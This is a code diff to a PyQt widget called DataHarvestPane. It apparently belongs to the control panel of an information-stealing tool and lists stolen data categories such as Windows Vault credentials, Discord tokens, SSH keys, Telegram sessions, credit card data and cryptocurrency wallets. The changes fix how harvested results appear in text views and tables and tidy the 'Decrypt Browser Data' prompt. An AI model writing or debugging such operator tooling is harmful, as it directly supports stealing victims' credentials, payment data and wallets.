@@ -24,7 +24,7 @@ class DataHarvestPane(QWidget):
             "Session Cookies", "Windows Vault Credentials", "Application Credentials", 
             "Discord Tokens", "Roblox Cookies", "SSH Keys", "Telegram Session Files", 
             "Credit Card Data", "Cryptocurrency Wallet Files", "Browser Autofill", 
-            "Browser History", "Clipboard Contents", "Browser Files (Raw)"
+            "Browser History", "Clipboard Contents", "Browser Files"
         ]
         self.category_list.addItems(self.categories)
         left_pane_layout.addWidget(self.category_list)
@@ -84,7 +84,9 @@ class DataHarvestPane(QWidget):
             elif isinstance(view, QTableWidget): view.setRowCount(0)
 
     def update_view(self, module_name, data):
-        view = self.view_map.get(module_name)
+        # The key for the view map doesn't have "(Raw)"
+        view_key = module_name.replace(" (Raw)", "")
+        view = self.view_map.get(view_key)
         if not view: return
 
         status = data.get("status", "success"); payload = data.get('data')
@@ -92,8 +94,9 @@ class DataHarvestPane(QWidget):
             if isinstance(view, QTextEdit): view.setText(f"Error harvesting this module:\n\n{payload}")
             return
 
-        if module_name == "Browser Files":
-            view.setText(f"Received browser data package.\n\nSize: {len(payload)} bytes.\n\nClick 'Decrypt Browser Data' to process.")
+        if view_key == "Browser Files":
+            size_kb = len(payload) / 1024 if payload else 0
+            view.setText(f"Received browser data package.\n\nSize: {size_kb:.2f} KB\n\nClick 'Decrypt Browser Data' to process.")
             return
 
         if isinstance(view, QTextEdit): self._populate_text_view(view, payload)
@@ -104,17 +107,35 @@ class DataHarvestPane(QWidget):
         if isinstance(data, dict):
             html = "".join([f"<p><b>{key.replace('_', ' ').title()}:</b> {value}</p>" for key, value in data.items()])
             view.setHtml(html)
-        elif isinstance(data, list): view.setText("\n".join(data))
+        elif isinstance(data, list): view.setText("\n".join(map(str, data)))
         else: view.setText(str(data))
 
     def _populate_table(self, table, data_list):
-        if not isinstance(data_list, list) or not data_list: table.setRowCount(0); return
+        table.setSortingEnabled(False)
+        if not isinstance(data_list, list) or not data_list:
+            table.setRowCount(0)
+            table.setSortingEnabled(True)
+            return
+            
         table.setRowCount(len(data_list))
+        
+        # --- DEFINITIVE FIX FOR SMOOTH OPERATION ---
+        # Robustly handle dictionary keys by creating a case-insensitive mapping
+        # from the table header text to the column index.
+        header_map = {header.lower().replace(' ', '_'): i for i, header in enumerate([table.horizontalHeaderItem(j).text() for j in range(table.columnCount())])}
+        
         for row_idx, row_data in enumerate(data_list):
             if isinstance(row_data, list):
-                 for col_idx, cell_data in enumerate(row_data): table.setItem(row_idx, col_idx, QTableWidgetItem(str(cell_data)))
+                # Handle data that comes in as a simple list
+                for col_idx, cell_data in enumerate(row_data):
+                    if col_idx < table.columnCount():
+                        table.setItem(row_idx, col_idx, QTableWidgetItem(str(cell_data)))
             elif isinstance(row_data, dict):
-                 headers = [h.lower() for h in [table.horizontalHeaderItem(i).text() for i in range(table.columnCount())]]
-                 for col_idx, header in enumerate(headers):
-                     table.setItem(row_idx, col_idx, QTableWidgetItem(str(row_data.get(header, 'N/A'))))
+                # Handle data that comes in as a dictionary
+                normalized_data_keys = {k.lower().replace(' ', '_'): v for k, v in row_data.items()}
+                for key, col_idx in header_map.items():
+                    value = normalized_data_keys.get(key, '') # Find value using normalized key
+                    table.setItem(row_idx, col_idx, QTableWidgetItem(str(value)))
+                    
         table.resizeColumnsToContents()
+        table.setSortingEnabled(True)
